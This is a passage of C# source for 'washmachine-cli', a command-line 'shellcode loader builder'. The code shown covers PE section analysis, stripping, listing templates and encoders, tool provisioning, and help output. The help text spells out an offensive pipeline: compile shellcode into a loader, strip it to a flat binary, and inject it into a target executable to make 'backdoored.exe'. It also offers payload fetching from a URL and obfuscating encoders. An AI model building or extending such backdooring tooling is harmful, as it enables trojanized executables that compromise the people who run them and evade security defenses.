        {
            var analysis = await stripper.AnalyzeAsync(peFile);

            AnsiConsole.Write(new Panel($"[bold cyan]PE Strip Analysis[/]  [grey]{Markup.Escape(peFile)}[/]")
                .BorderColor(Color.Cyan1)
                .Border(BoxBorder.Rounded));
            AnsiConsole.WriteLine();

            AnsiConsole.MarkupLine($"  [cyan]Architecture:[/]  [white]{(analysis.Is64Bit ? "x64" : "x86")}[/]");
            AnsiConsole.MarkupLine($"  [cyan]Entry Point:[/]   [magenta1]0x{analysis.EntryPoint:X8}[/]");
            AnsiConsole.MarkupLine($"  [cyan]EP Section:[/]    [white]{Markup.Escape(analysis.EntryPointSection ?? "unknown")}[/]");
            AnsiConsole.WriteLine();

            var table = new Table()
                .Border(TableBorder.Rounded)
                .BorderColor(Color.Grey)
                .AddColumn(new TableColumn("[cyan]Section[/]").LeftAligned())
                .AddColumn(new TableColumn("[cyan]RawAddr[/]").RightAligned())
                .AddColumn(new TableColumn("[cyan]RawSize[/]").RightAligned())
                .AddColumn(new TableColumn("[cyan]Perms[/]").Centered())
                .AddColumn(new TableColumn("[cyan]EP[/]").Centered());

            foreach (var sec in analysis.Sections)
            {
                string perms = (sec.IsReadable ? "R" : "-") + (sec.IsWritable ? "W" : "-") + (sec.IsExecutable ? "X" : "-");
                table.AddRow(
                    Markup.Escape(sec.Name),
                    $"[magenta1]0x{sec.RawAddress:X8}[/]",
                    $"[magenta1]0x{sec.RawSize:X8}[/]",
                    $"[white]{perms}[/]",
                    sec.ContainsEntryPoint ? "[green]<<<[/]" : ""
                );
            }

            AnsiConsole.Write(table);
            return 0;
        }

        outputFile ??= Path.Combine(
            Path.GetDirectoryName(peFile) ?? ".",
            Path.GetFileNameWithoutExtension(peFile) + ".bin");

        var options = new StripOptions
        {
            InputPath = peFile,
            OutputPath = outputFile,
            Mode = mode,
            SectionName = sectionName,
            TrimTrailingZeros = !noTrim,
            RawOffset = rangeStart,
            RawLength = (int)rangeLen,
        };

        try
        {
            var result = await AnsiConsole.Status()
                .Spinner(Spinner.Known.Dots)
                .SpinnerStyle(Style.Parse("cyan"))
                .StartAsync("Stripping PE...", async _ => await stripper.StripAsync(options));

            foreach (var w in result.Warnings)
                AnsiConsole.MarkupLine($"    [yellow]\u26A0[/] {Markup.Escape(w)}");

            if (result.Success)
            {
                AnsiConsole.Write(new Panel(
                    $"[green]Extracted {result.ExtractedSize:N0} bytes to {Markup.Escape(result.OutputPath ?? "unknown")}[/]\n" +
                    $"[grey]Original: {result.OriginalSize:N0} bytes | Trimmed: {result.TrimmedBytes:N0} bytes[/]")
                    .BorderColor(Color.Green)
                    .Border(BoxBorder.Rounded));
            }
            else
            {
                AnsiConsole.Write(new Panel($"[red]{Markup.Escape(result.Error ?? "Unknown error")}[/]")
                    .BorderColor(Color.Red)
                    .Border(BoxBorder.Rounded));
                return 1;
            }

            return 0;
        }
        catch (Exception ex)
        {
            AnsiConsole.MarkupLine($"[red]Strip failed:[/] [white]{Markup.Escape(ex.Message)}[/]");
            return 1;
        }
    }

    private static void PrintStripUsage()
    {
        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli strip [yellow]<pe-file>[/] [grey][[options]][/]");
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan]Options[/]").RuleStyle(Style.Parse("grey")).LeftJustified());

        var optTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        optTable.AddRow("[yellow]-o, --output <file>[/]", "Output .bin path (default: <input>.bin)");
        optTable.AddRow("[yellow]-m, --mode <mode>[/]", "ep | section | all-exec | range");
        optTable.AddRow("[yellow]--section <name>[/]", "Section name (for 'section' mode)");
        optTable.AddRow("[yellow]--range <start:len>[/]", "Raw file range (for 'range' mode, hex ok)");
        optTable.AddRow("[yellow]--no-trim[/]", "Don't trim trailing zeros");
        optTable.AddRow("[yellow]--analyze[/]", "Show section layout without extracting");

        AnsiConsole.Write(optTable);
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan]Pipeline[/]").RuleStyle(Style.Parse("grey")).LeftJustified());
        AnsiConsole.MarkupLine("  [dim]1.[/] [red]compile[/]  shellcode.bin  [dim]\u2192[/]  loader.exe");
        AnsiConsole.MarkupLine("  [dim]2.[/] [red]strip[/]    loader.exe     [dim]\u2192[/]  loader.bin");
        AnsiConsole.MarkupLine("  [dim]3.[/] [red]backdoor[/] loader.bin + target.exe  [dim]\u2192[/]  backdoored.exe");
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  list
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunListAsync(string[] args)
    {
        var logger = new ConsoleLogger();
        var paths = new AppPaths();

        if (args.Length == 0)
        {
            Console.Error.WriteLine("Usage: washmachine-cli list [--templates|--encoders|--snippets|--compilers]");
            return 1;
        }

        var what = args[0].TrimStart('-').ToLowerInvariant();

        switch (what)
        {
            case "templates":
            {
                var catalog = new YamlCodeSnippetCatalogService(paths);
                var templates = catalog.GetTemplates();

                var table = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey)
                    .Title($"[bold cyan]Templates[/] [grey]({templates.Count})[/]")
                    .AddColumn(new TableColumn("[cyan]ID[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan]Display[/]").LeftAligned());

                foreach (var t in templates)
                    table.AddRow($"[red]{Markup.Escape(t.Id)}[/]", Markup.Escape(t.Display));

                AnsiConsole.Write(table);
                break;
            }
            case "encoders":
            {
                var runner = new Bin2ShellRunner(paths);
                var encodingCatalog = new ShellcodeEncodingCatalogService(runner, paths);

                ShellcodeEncodingCatalog catalog;
                try
                {
                    catalog = await encodingCatalog.GetCatalogAsync();
                }
                catch (Exception ex)
                {
                    AnsiConsole.MarkupLine("[yellow]⚠ Bin2Shell is not available.[/]");
                    AnsiConsole.MarkupLine($"[grey]  {Markup.Escape(ex.Message)}[/]");
                    AnsiConsole.WriteLine();
                    AnsiConsole.MarkupLine("[dim]Run [cyan]washmachine-cli provision[/] to download Bin2Shell, then try again.[/]");
                    break;
                }

                var encTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey)
                    .Title($"[bold cyan]Encoders[/] [grey]({catalog.Encoders.Count})[/]")
                    .AddColumn("[cyan]Index[/]")
                    .AddColumn("[cyan]Name[/]")
                    .AddColumn("[cyan]Description[/]");

                foreach (var e in catalog.Encoders)
                    encTable.AddRow($"[magenta1]{e.Index}[/]", $"[white]{Markup.Escape(e.Name)}[/]", $"[grey]{Markup.Escape(e.Description)}[/]");

                AnsiConsole.Write(encTable);
                AnsiConsole.WriteLine();

                var envTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey)
                    .Title($"[bold cyan]Envelopes[/] [grey]({catalog.Envelopes.Count})[/]")
                    .AddColumn("[cyan]Index[/]")
                    .AddColumn("[cyan]Name[/]")
                    .AddColumn("[cyan]Description[/]");

                foreach (var e in catalog.Envelopes)
                    envTable.AddRow($"[magenta1]{e.Index}[/]", $"[white]{Markup.Escape(e.Name)}[/]", $"[grey]{Markup.Escape(e.Description)}[/]");

                AnsiConsole.Write(envTable);
                break;
            }
            case "snippets":
            {
                var catalog = new YamlCodeSnippetCatalogService(paths);
                var sections = catalog.GetAllSections();

                var tree = new Tree($"[bold cyan]Snippet Catalog[/] [grey]({sections.Count} sections)[/]");

                foreach (var s in sections)
                {
                    var node = tree.AddNode($"[bold yellow]{Markup.Escape(s.Header)}[/] [grey]({s.Items.Count} items)[/]");
                    foreach (var item in s.Items)
                    {
                        var label = item.IsDefault
                            ? $"[green]{Markup.Escape(item.Id)}[/] \u2014 {Markup.Escape(item.Display)} [green]\u2605 default[/]"
                            : $"[white]{Markup.Escape(item.Id)}[/] \u2014 [grey]{Markup.Escape(item.Display)}[/]";
                        node.AddNode(label);
                    }
                }

                AnsiConsole.Write(tree);
                break;
            }
            case "compilers":
            {
                var toolLocator = new CompilerToolLocator(logger);
                var result = await toolLocator.DiscoverAsync();

                if (result.Best != null)
                {
                    AnsiConsole.Write(new Panel($"[green]Best compiler:[/] [grey]{Markup.Escape(result.Best.Path)}[/] [dim]({Markup.Escape($"{result.Best.Kind}")})[/]")
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                    AnsiConsole.WriteLine();
                }

                var table = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey)
                    .Title($"[bold cyan]Candidates[/] [grey]({result.Candidates.Count})[/]")
                    .AddColumn(new TableColumn("[cyan]Kind[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan]Path[/]").LeftAligned());

                foreach (var c in result.Candidates)
                    table.AddRow($"[red]{Markup.Escape($"{c.Kind}")}[/]", $"[grey]{Markup.Escape(c.Path)}[/]");

                AnsiConsole.Write(table);

                if (result.Errors.Count > 0)
                {
                    AnsiConsole.WriteLine();
                    AnsiConsole.MarkupLine("[yellow]Errors:[/]");
                    foreach (var e in result.Errors)
                        AnsiConsole.MarkupLine($"  [red]{Markup.Escape(e)}[/]");
                }
                break;
            }
            default:
                Console.Error.WriteLine($"Unknown list target: {what}. Use --templates, --encoders, --snippets, or --compilers.");
                return 1;
        }

        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  provision
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunProvisionAsync(string[] args)
    {
        var logger = new ConsoleLogger();
        var paths = new AppPaths();
        var provisioner = new RequirementProvisioner(paths, logger);

        try
        {
            await AnsiConsole.Progress()
                .AutoClear(false)
                .HideCompleted(false)
                .Columns(new ProgressColumn[]
                {
                    new TaskDescriptionColumn(),
                    new ProgressBarColumn(),
                    new PercentageColumn(),
                    new SpinnerColumn(),
                })
                .StartAsync(async ctx =>
                {
                    var task = ctx.AddTask("Provisioning...");
                    task.IsIndeterminate = true;
                    var reporter = new SpectreProgressReporter(task);
                    await provisioner.EnsureRequirementsAsync(reporter);
                });

            return 0;
        }
        catch (Exception ex)
        {
            logger.Error($"Provisioning failed: {ex.Message}");
            return 1;
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  help
    // ═══════════════════════════════════════════════════════════════════════

    private static int PrintUsage()
    {
        AnsiConsole.MarkupLine("[white]Shellcode loader builder[/]");
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli [cyan]<command>[/] [grey][[options]][/]");
        AnsiConsole.WriteLine();

        var commandTable = new Table()
            .Border(TableBorder.Rounded)
            .BorderColor(Color.Grey)
            .AddColumn(new TableColumn("[cyan]Command[/]"))
            .AddColumn(new TableColumn("[white]Description[/]"));

        commandTable.AddRow("[red]compile[/]", "Build a shellcode loader executable");
        commandTable.AddRow("[red]analyze[/]", "Analyze a PE file (headers, sections, imports, code caves)");
        commandTable.AddRow("[red]backdoor[/]", "Inject shellcode into an existing PE file");
        commandTable.AddRow("[red]strip[/]", "Extract flat binary (.bin) from a PE file");
        commandTable.AddRow("[red]list[/]", "List available templates, encoders, snippets, or compilers");
        commandTable.AddRow("[red]provision[/]", "Download and install required external tools (Bin2Shell)");
        commandTable.AddRow("[red]test[/]", "Run the automated test harness");

        AnsiConsole.Write(new Panel(commandTable)
            .Header("[bold red]washmachine-cli[/]")
            .Border(BoxBorder.Rounded)
            .BorderColor(Color.Red));

        AnsiConsole.WriteLine();

        // compile options
        AnsiConsole.Write(new Rule("[cyan]compile options[/]").RuleStyle(Style.Parse("grey")).LeftJustified());

        var compileOptTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        compileOptTable.AddRow("[yellow]--shellcode, -s <file>[/]", "Path to shellcode .bin file");
        compileOptTable.AddRow("[yellow]--shellcode-hex <hex>[/]", "Hex-encoded shellcode string");
        compileOptTable.AddRow("[yellow]--shellcode-url, -u <url>[/]", "URL to fetch shellcode from");
        compileOptTable.AddRow("[yellow]--template, -t <id>[/]", "Template ID (default: shellcode-minimal)");
        compileOptTable.AddRow("[yellow]--encoder, -e <index>[/]", "Bin2Shell encoder index (default: 0 = none)");
        compileOptTable.AddRow("[yellow]--envelope, -v <index>[/]", "Bin2Shell envelope index (default: 0 = none)");
        compileOptTable.AddRow("[yellow]--snippet <key=value>[/]", "Snippet selection (repeatable)");
        compileOptTable.AddRow("[yellow]--verbose[/]", "Enable verbose logging");
        compileOptTable.AddRow("[yellow]--json[/]", "Output results as JSON");

        AnsiConsole.Write(compileOptTable);
        AnsiConsole.WriteLine();

        // analyze options
        AnsiConsole.Write(new Rule("[cyan]analyze options[/]").RuleStyle(Style.Parse("grey")).LeftJustified());

        var analyzeOptTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        analyzeOptTable.AddRow("[yellow]<pe-file>[/]", "Path to PE file to analyze");
        analyzeOptTable.AddRow("[yellow]--json[/]", "Output results as JSON");

        AnsiConsole.Write(analyzeOptTable);
        AnsiConsole.WriteLine();

        // backdoor options
        AnsiConsole.Write(new Rule("[cyan]backdoor options[/]").RuleStyle(Style.Parse("grey")).LeftJustified());

        var backdoorOptTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        backdoorOptTable.AddRow("[yellow]--pe <file>[/]", "Target PE file");
        backdoorOptTable.AddRow("[yellow]--shellcode, -s <file>[/]", "Shellcode to inject");
        backdoorOptTable.AddRow("[yellow]--output, -o <file>[/]", "Output file (default: <input>.backdoored.exe)");

        AnsiConsole.Write(backdoorOptTable);
        AnsiConsole.WriteLine();

        // strip options
        AnsiConsole.Write(new Rule("[cyan]strip options[/]").RuleStyle(Style.Parse("grey")).LeftJustified());

        var stripOptTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        stripOptTable.AddRow("[yellow]<pe-file>[/]", "PE file to extract binary from");
        stripOptTable.AddRow("[yellow]-o, --output <file>[/]", "Output .bin path (default: <input>.bin)");
        stripOptTable.AddRow("[yellow]-m, --mode <mode>[/]", "ep | section | all-exec | range");
        stripOptTable.AddRow("[yellow]--analyze[/]", "Show section layout without extracting");

        AnsiConsole.Write(stripOptTable);
        AnsiConsole.WriteLine();

        // list options
        AnsiConsole.Write(new Rule("[cyan]list options[/]").RuleStyle(Style.Parse("grey")).LeftJustified());

        var listOptTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        listOptTable.AddRow("[yellow]--templates[/]", "List available code templates");
        listOptTable.AddRow("[yellow]--encoders[/]", "List available encoders and envelopes");
        listOptTable.AddRow("[yellow]--snippets[/]", "List available snippet sections and items");
        listOptTable.AddRow("[yellow]--compilers[/]", "List discovered compiler toolchains");

        AnsiConsole.Write(listOptTable);
        AnsiConsole.WriteLine();

        // examples
        AnsiConsole.Write(new Rule("[cyan]Examples[/]").RuleStyle(Style.Parse("grey")).LeftJustified());
        AnsiConsole.MarkupLine("  [grey]washmachine-cli compile -s payload.bin -t shellcode-minimal[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli strip loader.exe -o loader.bin[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli backdoor --pe app.exe -s loader.bin[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli analyze target.exe --json[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli list --snippets[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli provision[/]");
        AnsiConsole.WriteLine();

        // pipeline
        AnsiConsole.Write(new Rule("[cyan]Pipeline[/]").RuleStyle(Style.Parse("grey")).LeftJustified());
        AnsiConsole.MarkupLine("  [dim]1.[/] [red]compile[/]   shellcode.bin  [dim]\u2192[/]  loader.exe");
        AnsiConsole.MarkupLine("  [dim]2.[/] [red]strip[/]     loader.exe     [dim]\u2192[/]  loader.bin");
        AnsiConsole.MarkupLine("  [dim]3.[/] [red]backdoor[/]  loader.bin + target.exe  [dim]\u2192[/]  backdoored.exe");

        return 0;
    }

    private static int PrintUnknownCommand(string command)
    {
        AnsiConsole.MarkupLine($"[red]Unknown command:[/] [white]{Markup.Escape(command)}[/]");
        AnsiConsole.MarkupLine("[grey]Run 'washmachine-cli help' for usage information.[/]");
        return 1;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  Spectre.Console progress reporter
    // ═══════════════════════════════════════════════════════════════════════

    private sealed class SpectreProgressReporter : IProgressReporter
    {
        private readonly ProgressTask _task;

        public SpectreProgressReporter(ProgressTask task)
        {
            _task = task;
        }

        public void UpdateStatus(string message, int percentComplete)
        {
            _task.Description = message;
            if (percentComplete >= 0)
            {
                _task.IsIndeterminate = false;
                _task.Value = percentComplete;
            }
            else
            {
                _task.IsIndeterminate = true;
            }
        }

        public void Close()
        {
            _task.Value = 100;
            _task.StopTask();
        }
    }
}
